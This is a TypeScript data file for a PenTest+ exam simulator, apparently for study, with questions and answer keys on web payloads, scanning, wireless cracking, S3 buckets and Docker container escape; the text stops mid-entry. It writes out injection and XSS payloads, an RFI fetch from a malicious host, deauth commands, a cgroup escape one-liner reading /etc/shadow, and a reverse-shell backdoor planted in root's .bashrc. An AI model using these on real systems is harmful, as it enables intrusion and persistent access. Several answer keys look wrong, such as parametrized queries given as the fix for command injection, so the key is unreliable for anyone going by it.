// CompTIA PenTest+ PT0-003 Simulator Data
// Type-safe interfaces and data for realistic PenTest+ PBQ simulations

// ===== TYPESCRIPT INTERFACES =====

export interface NmapCommand {
  id: string;
  flag: string;
  description: string;
}

export interface AttackVector {
  id: string;
  name: string;
  ports: number[];
  description: string;
}

export interface WebVulnerability {
  id: string;
  payload: string;
  vulnerabilityType: string;
  remediation: string;
  explanation: string;
}

export interface PythonCodeSegment {
  id: string;
  code: string;
  position: 'shebang' | 'ports' | 'loop' | 'function_call';
  isCorrect: boolean;
}

export interface DnsRecord {
  id: string;
  tool: string;
  command: string;
  result: string;
}

export interface ReconTool {
  id: string;
  name: string;
  description: string;
  syntax: string;
}

export interface ToolChallenge {
  id: string;
  scenario: string;
  tool: string;
  flags: string[];
  correctCommand: string;
  explanation: string;
}

export interface CloudVulnerability {
  id: string;
  service: string;
  misconfiguration: string;
  exploitPath: string;
  remediation: string;
}

export interface WebAppExploit {
  id: string;
  codeSnippet: string;
  vulnerability: string;
  exploitPayload: string;
  impact: string;
}

export interface MultipleChoiceQuestion {
  id: string;
  questionEN: string;
  questionDE: string;
  options: string[];
  correctAnswer: number;
  explanationEN: string;
  explanationDE: string;
  domain: 'Planning' | 'InfoGathering' | 'Attacks' | 'Reporting' | 'Tools';
}

// ===== PBQ 1: Web Vulnerability Identification (Based on ET63 P7) =====

export const webVulnScenario = {
  title: "Web Application Vulnerability Analysis",
  scenario: `You are a penetration tester tasked with hardening a web server. You have been given a list of HTTP payloads that were flagged as malicious by your intrusion detection system.\n\nYour Task:\n1. Analyze each payload to identify the attack type\n2. Select the appropriate remediation technique to prevent future attacks\n\nThe web application is a customer-facing portal built with PHP and MySQL, handling sensitive user data and financial transactions.`,
  instructions: "For each HTTP payload, identify the vulnerability type from the dropdown, then select the appropriate remediation technique.",
};

export const webVulnerabilities: WebVulnerability[] = [
  {
    id: 'vuln1',
    payload: 'lookup=$(whoami)',
    vulnerabilityType: 'Command Injection',
    remediation: 'Parametrized queries',
    explanation: 'Command injection occurs when user input is executed as system commands. The $(whoami) syntax executes shell commands. Remediation requires input sanitization and avoiding direct command execution.'
  },
  {
    id: 'vuln2',
    payload: 'search=Bob"><img src=a onerror=alert(1)>',
    vulnerabilityType: 'Reflected Cross Site Scripting',
    remediation: 'Input Sanitization", <, >',
    explanation: 'Reflected XSS embeds malicious scripts in URLs that execute when the page renders. The <img> tag with onerror handler executes JavaScript. Sanitize HTML special characters.'
  },
  {
    id: 'vuln3',
    payload: 'logfile=/etc/passwd%00',
    vulnerabilityType: 'Local File Inclusion',
    remediation: 'Input Sanitization.\\, /, sandbox requests',
    explanation: 'LFI allows attackers to include local files. The null byte (%00) bypasses extension filters. Sanitize path traversal characters and implement whitelisting.'
  },
  {
    id: 'vuln4',
    payload: '#inner-tab"<script>alert(1)</script>',
    vulnerabilityType: 'DOM-based Cross Site Scripting',
    remediation: 'Input Sanitization", <, >',
    explanation: 'DOM XSS occurs when client-side scripts unsafely handle user input. The fragment identifier (#) isn\'t sent to server, making detection harder. Sanitize DOM manipulations.'
  },
  {
    id: 'vuln5',
    payload: `site=www.exa'ping -c 10 localhost'mple.com`,
    vulnerabilityType: 'Command Injection',
    remediation: 'Parametrized queries',
    explanation: 'Command injection using single quotes to break out of string context and execute commands. Use parameterized queries and avoid shell command execution.'
  },
  {
    id: 'vuln6',
    payload: 'redir=http://www.malicious-site.com',
    vulnerabilityType: 'URL Redirect',
    remediation: 'Preventing external calls',
    explanation: 'Open redirect vulnerability allows attackers to redirect users to malicious sites. Implement whitelist of allowed redirect destinations.'
  },
  {
    id: 'vuln7',
    payload: `item=widget'waitfor delay'00:00:20'`,
    vulnerabilityType: 'SQL Injection (Stacked)',
    remediation: 'Parametrized queries',
    explanation: 'Time-based blind SQL injection using WAITFOR DELAY to infer database information. Use parameterized queries to prevent SQL injection.'
  },
  {
    id: 'vuln8',
    payload: 'item=widget union select null,null,@@version;--',
    vulnerabilityType: 'SQL Injection (Union)',
    remediation: 'Parametrized queries',
    explanation: 'Union-based SQL injection extracts data by combining results from malicious queries. Parameterized queries prevent SQL code injection.'
  },
  {
    id: 'vuln9',
    payload: `item=widget'convert(int,@@version)'`,
    vulnerabilityType: 'SQL Injection (Error)',
    remediation: 'Parametrized queries',
    explanation: 'Error-based SQL injection triggers database errors to reveal information. Use parameterized queries and suppress detailed error messages.'
  },
  {
    id: 'vuln10',
    payload: 'logFile=http://www.malicious-site.com/shell.txt',
    vulnerabilityType: 'Remote File Inclusion',
    remediation: 'Input Sanitization.\\, /, sandbox requests',
    explanation: 'RFI allows inclusion of remote files, potentially executing malicious code. Disable remote file inclusion and sanitize file paths.'
  }
];

export const vulnerabilityTypes = [
  'Command Injection',
  'DOM-based Cross Site Scripting',
  'SQL Injection (Error)',
  'SQL Injection (Stacked)',
  'SQL Injection (Union)',
  'Reflected Cross Site Scripting',
  'Local File Inclusion',
  'Remote File Inclusion',
  'URL Redirect'
];

export const remediationTechniques = [
  'Parametrized queries',
  'Preventing external calls',
  `Input Sanitization.\\, /, sandbox requests`,
  `Input Sanitization', $, {,} (,)`,
  `Input Sanitization", <, >`
];

// ===== PBQ 2: Nmap Command Construction (Based on ET56 P12) =====

export const nmapScenario = {
  title: "Network Port Scanning with Nmap",
  scenario: `You are a penetration tester running port scans on a target server during the reconnaissance phase.\n\nTarget Information:\n- IP Address: 192.168.2.2\n- Organization: Medium-sized financial services company\n- Objective: Identify open ports, running services, and potential attack vectors\n\nPart 1: Construct the Nmap command that generated the provided scan output\nPart 2: Based on the scan results, identify potential attack vectors for further investigation`,
  instructions: "Drag and drop the appropriate Nmap flags and parameters to construct the correct command. Then select all applicable attack vectors based on the scan output.",
  scanOutput: `Nmap scan report for 192.168.2.2
Host is up (0.00079s latency).
Not shown: 96 closed ports
PORT    STATE SERVICE      VERSION
88/tcp  open  kerberos-sec?
139/tcp open  netbios-ssn
389/tcp open  ldap?
445/tcp open  microsoft-ds?
MAC Address: 08:00:27:81:81:DF (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4.21
OS details: Linux 2.4.21
Network Distance: 1 hop
Nmap done: 1 IP address (1 host up) scanned in 26.80 seconds`
};

export const nmapCommandOptions: NmapCommand[] = [
  { id: 'cmd1', flag: 'nmap', description: 'Nmap tool' },
  { id: 'cmd2', flag: '-sV', description: 'Version detection' },
  { id: 'cmd3', flag: '-p 1-1023', description: 'Scan ports 1-1023' },
  { id: 'cmd4', flag: '192.168.2.2', description: 'Target IP' },
  { id: 'cmd5', flag: '-Pn', description: 'Skip host discovery' },
  { id: 'cmd6', flag: '-sU', description: 'UDP scan' },
  { id: 'cmd7', flag: '-O', description: 'OS detection' },
  { id: 'cmd8', flag: '--top-ports=100', description: 'Top 100 ports' },
  { id: 'cmd9', flag: '--top-ports=1000', description: 'Top 1000 ports' },
  { id: 'cmd10', flag: '-sL', description: 'List scan' },
  { id: 'cmd11', flag: '192.168.2.1-100', description: 'IP range' },
  { id: 'cmd12', flag: 'nc', description: 'Netcat tool' },
  { id: 'cmd13', flag: 'hping', description: 'Hping tool' }
];

export const correctNmapCommand = ['nmap', '-sV', '-p 1-1023', '192.168.2.2'];

export const attackVectors: AttackVector[] = [
  {
    id: 'av1',
    name: 'Null session enumeration',
    ports: [139, 445],
    description: 'SMB ports 139 and 445 are open, allowing potential null session attacks to enumerate users, shares, and system information without authentication.'
  },
  {
    id: 'av2',
    name: 'Weak SMB file permissions',
    ports: [445],
    description: 'Port 445 (microsoft-ds) suggests SMB file sharing may be enabled with potentially weak permissions, allowing unauthorized access to sensitive files.'
  },
  {
    id: 'av3',
    name: 'Kerberos attacks',
    ports: [88],
    description: 'Port 88 (Kerberos) is open, indicating Active Directory environment. Potential for Kerberoasting, AS-REP roasting, or Golden Ticket attacks.'
  },
  {
    id: 'av4',
    name: 'LDAP enumeration',
    ports: [389],
    description: 'Port 389 (LDAP) allows querying directory services for user accounts, group memberships, and organizational structure information.'
  }
];

export const incorrectAttackVectors = [
  'Weak Apache Tomcat Credentials',
  'Webdav file upload',
  'ARP spoofing',
  'SNMP enumeration',
  'Fragmentation attack',
  'FTP anonymous login'
];

export const correctAttackVectors = ['av1', 'av2', 'av4']; // Null session, Weak SMB, LDAP enumeration

// ===== PBQ 3: Certificate Security Analysis (Based on ET11 P21) =====

export const certificateScenario = {
  title: "Web Application Security Assessment",
  scenario: `You are conducting a security assessment of a web application login page at https://comptia.org/login.aspx.\n\nYour Task:\n1. Review the SSL/TLS certificate\n2. Analyze the page source code\n3. Examine stored cookies\n4. Identify the HIGHEST severity vulnerability\n5. Select the appropriate remediation steps\n\nRemember: You must remediate ONLY the highest severity vulnerability. Multiple issues may exist, but prioritize based on immediate exploitability and impact.`,
  instructions: "Click View Certificate, View Source, and View Cookies to examine each area. Identify the most critical vulnerability, then select the correct remediation steps in order.",
};

export interface CertificateVulnerability {
  id: string;
  area: 'certificate' | 'source' | 'cookies';
  issue: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  remediationSteps: string[];
  explanation: string;
}

export const certificateVulnerabilities: CertificateVulnerability[] = [
  {
    id: 'cert_expired',
    area: 'certificate',
    issue: 'Expired SSL/TLS Certificate',
    severity: 'Critical',
    remediationSteps: [
      'Remove certificate from server',
      'Generate a Certificate Signing Request',
      'Submit CSR to the CA',
      'Install re-issued certificate on the server'
    ],
    explanation: 'An expired certificate causes browser warnings and prevents secure HTTPS connections. This is the highest priority as it affects all users immediately. Steps: 1) Remove old cert, 2) Generate CSR with private key, 3) Submit to CA for signing, 4) Install new valid certificate.'
  },
  {
    id: 'source_creds',
    area: 'source',
    issue: 'Hardcoded Credentials in Source Code',
    severity: 'Critical',
    remediationSteps: [
      'Remove hardcoded credentials from source',
      'Store credentials in secure configuration',
      'Implement environment variables',
      'Rotate compromised credentials'
    ],
    explanation: 'Credentials visible in HTML source code can be extracted by anyone viewing page source. While critical, the expired cert affects ALL connections whereas this requires user action to exploit.'
  },
  {
    id: 'cookie_insecure',
    area: 'cookies',
    issue: 'Missing Secure and HttpOnly Flags',
    severity: 'High',
    remediationSteps: [
      'Add Secure flag to session cookies',
      'Add HttpOnly flag to prevent XSS',
      'Implement SameSite attribute',
      'Review cookie expiration times'
    ],
    explanation: 'Missing security flags expose cookies to interception (Secure flag) and XSS attacks (HttpOnly flag). High severity but requires active attack to exploit.'
  }
];

// ===== PBQ 4: Python Port Scanner Scripting (Based on ET48 P134) =====

export const pythonScriptScenario = {
  title: "Python Port Scanning Script Development",
  scenario: `During a penetration test, you gain access to a system with a limited user interface. This machine appears to have access to an isolated network that you would like to port scan.\n\nYou need to complete a Python port scanning script to identify open ports on target systems in the isolated network.\n\nTarget: The script should scan ports 21 (FTP) and 22 (SSH) on a host provided as a command-line argument.`,
  instructions: "Drag the appropriate code segments into the correct positions to complete the functional port scanning script. The script must: 1) Use Python, 2) Define ports to scan, 3) Iterate through ports properly, 4) Call the scan function with command-line argument.",
};

export const pythonCodeSegments: PythonCodeSegment[] = [
  {
    id: 'shebang_python',
    code: '#!/usr/bin/python',
    position: 'shebang',
    isCorrect: true
  },
  {
    id: 'shebang_ruby',
    code: '#!/usr/bin/ruby',
    position: 'shebang',
    isCorrect: false
  },
  {
    id: 'shebang_bash',
    code: '#!/usr/bin/bash',
    position: 'shebang',
    isCorrect: false
  },
  {
    id: 'ports_list',
    code: 'ports = [21, 22]',
    position: 'ports',
    isCorrect: true
  },
  {
    id: 'ports_dict',
    code: '{ports => 21 ports => 22}',
    position: 'ports',
    isCorrect: false
  },
  {
    id: 'ports_export',
    code: 'export SPORTS = 21,22',
    position: 'ports',
    isCorrect: false
  },
  {
    id: 'loop_python',
    code: 'for port in ports:\n    try:\n        s.connect((ip, port))\n        print("%s:%s - OPEN" % (ip, port))\n    except socket.timeout:\n        print("%s:%s - TIMEOUT" % (ip, port))\n    except socket.error as e:\n        print("%s:%s - CLOSED" % (ip, port))\n    finally:\n        s.close()',
    position: 'loop',
    isCorrect: true
  },
  {
    id: 'loop_bash',
    code: 'for SPORT IN SPORTS:\n    try:\n        s.connect((ip, port))\n        print("%s:%s - OPEN" % (ip, port))\n    except socket.timeout\n        print("%s:%s - TIMEOUT" % (ip, port))\n    except socket error as e\n        print("%s:%s - CLOSED" % (ip, port))\n    finally\n        s.close()',
    position: 'loop',
    isCorrect: false
  },
  {
    id: 'call_correct',
    code: 'port_scan(sys.argv[1], ports)',
    position: 'function_call',
    isCorrect: true
  },
  {
    id: 'call_wrong',
    code: 'run_scan(sys.argv[1], SPORTS)',
    position: 'function_call',
    isCorrect: false
  }
];

export const correctPythonScript = {
  shebang: '#!/usr/bin/python',
  ports: 'ports = [21, 22]',
  loop: 'for port in ports:',
  function_call: 'port_scan(sys.argv[1], ports)'
};

// ===== PBQ 5: DNS Reconnaissance (Based on ET337 P358) =====

export const dnsReconScenario = {
  title: "External DNS Reconnaissance",
  scenario: `A penetration tester has been provided with only the public domain name "someclouddomain.org" and must enumerate additional information for public-facing assets.\n\nYour Environment:\n- Your Domain: pentestdomain.com\n- Your IP Address: 10.97.55.62\n- Public DNS Server: 8.8.8.8\n- Private DNS Server: 192.168.20.66\n- Target Domain: someclouddomain.org\n\nYour Task:\n1. Identify which tool created specific reconnaissance output\n2. Determine correct commands for DNS enumeration\n3. Analyze WHOIS data to identify hosting provider and domain registrar`,
  instructions: "Review each output section and answer the corresponding questions about tools, commands, and reconnaissance findings.",
};

export interface DnsReconQuestion {
  id: string;
  section: 'output1' | 'output2' | 'output3';
  question: string;
  options: string[];
  correctAnswer: string | string[];
  explanation: string;
}

export const dnsReconQuestions: DnsReconQuestion[] = [
  {
    id: 'q1_tool',
    section: 'output1',
    question: 'Which of the following tools created this output?',
    options: ['WHOIS', 'dig', 'Nmap', 'TheHarvester'],
    correctAnswer: 'TheHarvester',
    explanation: 'TheHarvester is an OSINT tool that collects emails, subdomains, and hosts from public sources. The output showing "emails found" and "hosts found with IP" is characteristic of theHarvester.'
  },
  {
    id: 'q1_command',
    section: 'output1',
    question: 'Select the appropriate command to produce the output:',
    options: [
      'theharvester -d someclouddomain.org -l 200 -b google.com',
      'theharvester -d google.com -l 200 -b someclouddomain.org'
    ],
    correctAnswer: 'theharvester -d someclouddomain.org -l 200 -b google.com',
    explanation: '-d specifies the target domain to enumerate, -l limits results, -b specifies the data source (search engine). Correct syntax: -d <target> -b <source>'
  },
  {
    id: 'q2_commands',
    section: 'output2',
    question: 'Select TWO commands that would produce the nslookup and dig output:',
    options: [
      'dig @8.8.8.8 +noall +answer someclouddomain.org',
      'dig @192.168.20.66 someclouddomain.org +short',
      'dig someclouddomain.org +noall +short',
      'nslookup someclouddomain.org 8.8.8.8',
      'nslookup someclouddomain.org 192.168.20.66',
      'nslookup someclouddomain.org'
    ],
    correctAnswer: ['dig @8.8.8.8 +noall +answer someclouddomain.org', 'nslookup someclouddomain.org 8.8.8.8'],
    explanation: '@8.8.8.8 specifies using Google public DNS. +noall +answer shows only answer section. nslookup requires DNS server as second argument when not using default.'
  },
  {
    id: 'q3_hosting',
    section: 'output3',
    question: 'Where is the domain being hosted?',
    options: ['Amazon', 'ARIN', 'LocalComputerPro\'s.com', 'Someclouddomain'],
    correctAnswer: 'Amazon',
    explanation: 'WHOIS NetName field shows "Amazon-05", indicating AWS hosting. ARIN is the regional registry, not the hosting provider.'
  },
  {
    id: 'q3_registrar',
    section: 'output3',
    question: 'Who registered the domain?',
    options: ['LocalComputerPro\'s, Inc.', 'ARIN', 'Someclouddomain', 'Amazon'],
    correctAnswer: 'LocalComputerPro\'s, Inc.',
    explanation: 'The "Registrar" field in domain WHOIS indicates who registered the domain, not who hosts it or who the registry is.'
  },
  {
    id: 'q3_date',
    section: 'output3',
    question: 'When was the domain registered?',
    options: ['1993-09-22T04:00:38Z', '2021-02-15T04:43:38Z', '2015-09-24', '2010-06-27'],
    correctAnswer: '1993-09-22T04:00:38Z',
    explanation: 'Creation Date field shows the original domain registration date, distinct from Updated Date or Registry Expiry Date.'
  }
];

// ===== PBQ 6: Robots.txt Analysis & Tool Selection (Based on ET267 P322) =====

export const robotsTxtScenario = {
  title: "Web Application Reconnaissance - Robots.txt Analysis",
  scenario: `A penetration tester is performing reconnaissance for a web application assessment. Upon investigation, the tester reviews the robots.txt file at http://example.com/robots.txt.\n\nRobots.txt Contents:\n1  User-agent: *\n2  Disallow: /search\n3  Allow: /search/about\n4  User-agent: acunetix\n5  crawl-delay: 10\n6  Allow: /search/static\n7  User-agent: Baidu\n8  crawl-delay: 12\n9  Disallow: /Home\n10 User-agent: Slurp\n11 crawl-delay: 20\n12 Allow: /sdch\n13 User-agent: Comptia\n14 Allow: /admin\n15 Allow: /wp-admin\n16 crawl-delay: 15\n17 Allow: /groups\n18 Allow: /?hl=\n19 Allow: /wp-login.php\n\nYour Task:\n1. Identify paths that should be removed from robots.txt (revealing sensitive directories)\n2. Select appropriate tool for WordPress security testing`,
  instructions: "Select the correct tool for further investigation, then identify TWO entries that should be removed from robots.txt.",
};

export interface RobotsTxtQuestion {
  id: string;
  type: 'tool_selection' | 'entry_removal';
  question: string;
  options: string[];
  correctAnswer: string | string[];
  explanation: string;
}

export const robotsTxtQuestions: RobotsTxtQuestion[] = [
  {
    id: 'tool',
    type: 'tool_selection',
    question: 'Given the entries in robots.txt, select the tool the penetration tester should use for further investigation:',
    options: ['Mimikatz', 'SQLmap', 'WPScan', 'Brakeman'],
    correctAnswer: 'WPScan',
    explanation: 'WPScan is a WordPress security scanner. Lines 15 (/wp-admin) and 19 (/wp-login.php) indicate a WordPress installation. Mimikatz extracts Windows credentials, SQLmap tests SQL injection, Brakeman scans Ruby on Rails apps.'
  },
  {
    id: 'entries',
    type: 'entry_removal',
    question: 'Select the two robots.txt entries the penetration tester should recommend for removal:',
    options: [
      'Line 2: Disallow: /search',
      'Line 9: Disallow: /Home',
      'Line 14: Allow: /admin',
      'Line 15: Allow: /wp-admin'
    ],
    correctAnswer: ['Line 2: Disallow: /search', 'Line 9: Disallow: /Home'],
    explanation: '"Disallow" directives in robots.txt reveal sensitive directories to attackers. /search and /Home shouldn\'t be listed as they advertise hidden paths. Allow directives for /admin and /wp-admin are already public knowledge for WordPress and less concerning.'
  }
];

// ===== PBQ 7: Wireless Network Penetration (NEW - Based on PT0-003) =====

export const wirelessPenTestScenario = {
  title: "Wireless Network Security Assessment - WPA2 Enterprise",
  scenario: `You are conducting a wireless penetration test for a corporate client. The target is their WPA2-Enterprise network using RADIUS authentication.\n\nTarget Network:\n- SSID: CorpNet-Secure\n- Authentication: WPA2-Enterprise (802.1X)\n- Encryption: CCMP (AES)\n- RADIUS Server: 192.168.100.50\n- AP MAC: 00:1A:2B:3C:4D:5E\n\nYour Task:\n1. Capture authentication handshakes\n2. Perform offline brute-force attacks on captured hashes\n3. Identify EAP method vulnerabilities\n4. Recommend security improvements`,
  instructions: "Select the correct tools and techniques for each phase of the wireless penetration test.",
};

export interface WirelessAttackPhase {
  id: string;
  phase: string;
  task: string;
  correctTool: string;
  correctCommand: string;
  explanation: string;
}

export const wirelessAttackPhases: WirelessAttackPhase[] = [
  {
    id: 'phase1',
    phase: 'Reconnaissance',
    task: 'Identify all wireless networks and their security configurations',
    correctTool: 'airodump-ng',
    correctCommand: 'airodump-ng wlan0mon',
    explanation: 'Airodump-ng captures wireless packets and displays network information including SSID, BSSID, channel, encryption, and connected clients.'
  },
  {
    id: 'phase2',
    phase: 'Capture',
    task: 'Capture WPA2-Enterprise authentication handshakes (EAPOL frames)',
    correctTool: 'airodump-ng',
    correctCommand: 'airodump-ng -c 6 --bssid 00:1A:2B:3C:4D:5E -w capture wlan0mon',
    explanation: 'Target specific channel (-c) and BSSID (--bssid) to capture authentication attempts. -w specifies output file for captured handshakes.'
  },
  {
    id: 'phase3',
    phase: 'Deauthentication',
    task: 'Force client reconnection to capture fresh authentication',
    correctTool: 'aireplay-ng',
    correctCommand: 'aireplay-ng --deauth 5 -a 00:1A:2B:3C:4D:5E wlan0mon',
    explanation: 'Sends deauthentication frames to disconnect clients. When they reconnect, fresh EAPOL handshakes are captured. --deauth 5 sends 5 deauth packets.'
  },
  {
    id: 'phase4',
    phase: 'Hash Extraction',
    task: 'Extract hashes from captured WPA2-Enterprise handshakes',
    correctTool: 'eapmd5pass',
    correctCommand: 'eapmd5pass -r capture-01.cap -w wordlist.txt',
    explanation: 'Extracts EAP-MD5 challenge-response pairs from packet captures for offline cracking. EAP-MD5 is vulnerable to dictionary attacks.'
  },
  {
    id: 'phase5',
    phase: 'Offline Cracking',
    task: 'Perform dictionary attack on captured authentication hashes',
    correctTool: 'asleap',
    correctCommand: 'asleap -r capture-01.cap -W wordlist.txt',
    explanation: 'Asleap cracks LEAP and PEAP authentication by performing dictionary attacks on captured challenge-response pairs.'
  }
];

export const wirelessToolOptions = [
  'airodump-ng',
  'aireplay-ng',
  'aircrack-ng',
  'asleap',
  'eapmd5pass',
  'Kismet',
  'Wifite',
  'Reaver',
  'Bettercap'
];

// ===== PBQ 8: Cloud Security - AWS S3 Bucket Exploitation (NEW) =====

export const cloudS3Scenario = {
  title: "Cloud Security Assessment - AWS S3 Misconfiguration",
  scenario: `During an external penetration test, you discover several AWS S3 buckets belonging to the target organization.\n\nDiscovered S3 Buckets:\n1. company-backups-2024\n2. prod-database-dumps\n3. public-assets-cdn\n4. employee-documents\n5. dev-application-logs\n\nYour Task:\n1. Enumerate S3 bucket permissions and access controls\n2. Identify publicly accessible buckets\n3. Attempt to list, read, and write objects\n4. Document potential data exposure risks\n5. Recommend AWS security hardening measures`,
  instructions: "For each S3 bucket, test the permissions and identify the correct exploitation technique and remediation.",
};

export interface S3BucketVuln {
  id: string;
  bucketName: string;
  vulnerability: string;
  awsCliCommand: string;
  impact: string;
  remediation: string;
}

export const s3BucketVulnerabilities: S3BucketVuln[] = [
  {
    id: 's3_1',
    bucketName: 'company-backups-2024',
    vulnerability: 'Public Read Access (s3:GetObject)',
    awsCliCommand: 'aws s3 ls s3://company-backups-2024 --no-sign-request',
    impact: 'Critical: Full database backups containing customer PII, passwords, and financial data are publicly downloadable. Attackers can enumerate and download all backup files without authentication.',
    remediation: 'Remove public access: aws s3api put-bucket-acl --bucket company-backups-2024 --acl private. Enable S3 Block Public Access. Implement bucket policies with explicit deny for public access.'
  },
  {
    id: 's3_2',
    bucketName: 'prod-database-dumps',
    vulnerability: 'Public List Access (s3:ListBucket)',
    awsCliCommand: 'aws s3 ls s3://prod-database-dumps --no-sign-request',
    impact: 'High: Attackers can enumerate all objects in the bucket, revealing file structure, naming conventions, and database schemas. While objects may not be readable, metadata exposure aids targeted attacks.',
    remediation: 'Disable public bucket listing via bucket policy. Use IAM roles with least privilege. Enable S3 Access Logging to monitor access attempts.'
  },
  {
    id: 's3_3',
    bucketName: 'employee-documents',
    vulnerability: 'Public Write Access (s3:PutObject)',
    awsCliCommand: 'aws s3 cp malicious.html s3://employee-documents/ --no-sign-request',
    impact: 'Critical: Attackers can upload malicious files, potentially hosting malware distribution, phishing pages, or cryptominers at organization expense. Can lead to domain reputation damage and legal liability.',
    remediation: 'Immediately revoke s3:PutObject for public principals. Implement MFA Delete. Use S3 Object Lock for immutability. Enable versioning to recover from unauthorized modifications.'
  },
  {
    id: 's3_4',
    bucketName: 'dev-application-logs',
    vulnerability: 'Authenticated-Users Group Access',
    awsCliCommand: 'aws s3 ls s3://dev-application-logs (requires any AWS account)',
    impact: 'Medium: Any authenticated AWS user (not just your organization) can access logs. Application logs may contain API keys, tokens, internal IPs, and debugging information useful for further attacks.',
    remediation: 'Remove "Authenticated Users" ACL. Replace with IAM policies scoped to specific IAM principals. Use CloudWatch Logs instead of S3 for sensitive application logging.'
  },
  {
    id: 's3_5',
    bucketName: 'public-assets-cdn',
    vulnerability: 'Intentional Public Access (Properly Configured)',
    awsCliCommand: 'aws s3 ls s3://public-assets-cdn --no-sign-request',
    impact: 'Low: Bucket intentionally serves public web assets (CSS, JS, images). However, lacks CloudFront CDN, causing high bandwidth costs and no DDoS protection. No sensitive data exposure risk.',
    remediation: 'Acceptable for public assets if properly scoped. Recommendations: Implement CloudFront CDN, enable S3 bucket logging, use separate bucket from sensitive data, implement CORS policies.'
  }
];

export const s3RemediationSteps = [
  'Enable S3 Block Public Access (Account and Bucket level)',
  'Remove public ACLs and replace with IAM-based access',
  'Implement least-privilege bucket policies',
  'Enable S3 Access Logging and CloudTrail',
  'Use S3 Object Lock for immutability requirements',
  'Implement MFA Delete for bucket objects',
  'Use CloudFront CDN for public content delivery',
  'Enable S3 Versioning for recovery',
  'Regular AWS Config rules to detect misconfigurations',
  'Implement AWS Macie for sensitive data discovery'
];

// ===== PBQ 9: Container Escape - Docker Exploitation (NEW) =====

export const containerEscapeScenario = {
  title: "Container Security - Docker Privilege Escalation & Escape",
  scenario: `During an internal penetration test, you gain shell access to a Docker container running as part of the organization's microservices architecture.\n\nContainer Environment:\n- Container ID: c8f3d91e4a2b\n- Base Image: ubuntu:20.04\n- Running User: root (inside container)\n- Host OS: Ubuntu 22.04 LTS\n- Docker Version: 24.0.7\n\nInitial Enumeration Results:\n- Container is running in privileged mode\n- Host filesystem potentially accessible via /host mount\n- Docker socket mounted at /var/run/docker.sock\n- CAP_SYS_ADMIN capability detected\n\nYour Goal: Escape the container to gain access to the underlying host system.`,
  instructions: "Follow the exploitation path to achieve container escape. Select the correct commands and techniques for each phase.",
};

export interface ContainerEscapePhase {
  id: string;
  phase: string;
  task: string;
  correctCommand: string;
  explanation: string;
  impact: string;
}

export const containerEscapePhases: ContainerEscapePhase[] = [
  {
    id: 'enum_1',
    phase: 'Enumeration',
    task: 'Check if running in privileged mode',
    correctCommand: 'cat /proc/self/status | grep CapEff',
    explanation: 'CapEff shows effective capabilities. 0000003fffffffff indicates privileged container with all capabilities. Compare with 0000000000000000 (unprivileged).',
    impact: 'Privileged containers have almost all capabilities, allowing kernel module loading and device access - primary vector for container escape.'
  },
  {
    id: 'enum_2',
    phase: 'Enumeration',
    task: 'Identify if Docker socket is accessible',
    correctCommand: 'ls -la /var/run/docker.sock',
    explanation: 'Docker socket provides API access to Docker daemon. If mounted in container, attackers can create new containers, mount host filesystem, and execute commands on host.',
    impact: 'Docker socket access = complete host compromise. Attacker can spawn privileged containers with host root filesystem mounted.'
  },
  {
    id: 'exploit_1',
    phase: 'Exploitation',
    task: 'Exploit Docker socket to spawn privileged container with host filesystem',
    correctCommand: 'docker run -it --rm -v /:/host ubuntu:20.04 chroot /host /bin/bash',
    explanation: 'Mounts entire host root (/) to /host in new container, then chroots into it. This provides a shell with full host filesystem access running as host root.',
    impact: 'Full host compromise. Attacker now has root shell on underlying host with access to all containers, sensitive data, and ability to persist access.'
  },
  {
    id: 'exploit_2',
    phase: 'Exploitation',
    task: 'Exploit privileged mode using cgroup release_agent',
    correctCommand: 'd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`; mkdir -p $d/w; echo 1 >$d/w/notify_on_release; t=`sed -n \'s/.*\\perdir=\\([^,]*\\).*/\\1/p\' /etc/mtab`; touch /o; echo $t/c >$d/release_agent; echo "#!/bin/sh" >/c; echo "cat /etc/shadow >/o" >>/c; chmod +x /c; sh -c "echo 0 >$d/w/cgroup.procs"; sleep 1; cat /o',
    explanation: 'Abuses cgroup notify_on_release feature in privileged containers. Creates cgroup, sets release_agent to script on host that executes when cgroup becomes empty. Classic container escape technique.',
    impact: 'Arbitrary command execution on host as root. Demonstrated by reading /etc/shadow, but can install backdoors, exfiltrate data, or pivot to other systems.'
  },
  {
    id: 'exploit_3',
    phase: 'Exploitation',
    task: 'Mount host filesystem using privileged capabilities',
    correctCommand: 'mkdir /host_fs; mount /dev/sda1 /host_fs',
    explanation: 'Privileged containers can access host block devices. Mounts host partition directly to read/write host filesystem, bypassing container isolation.',
    impact: 'Full filesystem access. Can read sensitive files (SSH keys, credentials), modify system files, or plant persistence mechanisms on the host.'
  },
  {
    id: 'persist',
    phase: 'Post-Exploitation',
    task: 'Establish persistence on the host',
    correctCommand: 'echo "bash -i >& /dev/tcp/10.10.10.5/4444 0>&1" >> /host_fs/root/.bashrc',
    explanation: 'Adds reverse shell to root user bashrc on host. Executes whenever root logs in, providing persistent access even after container is stopped.',
    impact: 'Persistent backdoor. Survives container restarts and provides ongoing access to the host system.'
  }
];

export const containerEscapeRemediation = {
  vulnerabilities: [
    'Privileged mode enabled (--privileged flag)',
    'Docker socket mounted inside container',
    'Excessive Linux capabilities granted',
    'Host filesystem mount points accessible',
    'Running as root inside container'
  ],
  remediations: [
    'Never run containers in privileged mode unless absolutely necessary',
    'Never mount Docker socket inside containers',
    'Use --cap-drop=ALL and add only required capabilities with --cap-add',
    'Implement AppArmor or SELinux profiles for containers',
    'Run containers as non-root user (USER directive in Dockerfile)',
    'Use Docker security scanning (docker scan) to detect vulnerabilities',
    'Implement runtime security monitoring (Falco, Sysdig)',
    'Enable Docker Content Trust for image verification',
    'Use read-only root filesystem (--read-only flag)',
    'Implement network segmentation for container environments'
  ]
};

// ===== PBQ 10: Web Application - DOM-Based XSS Analysis (NEW) =====

export const domXssScenario = {
  title: "Advanced Web Application Security - DOM-Based XSS",
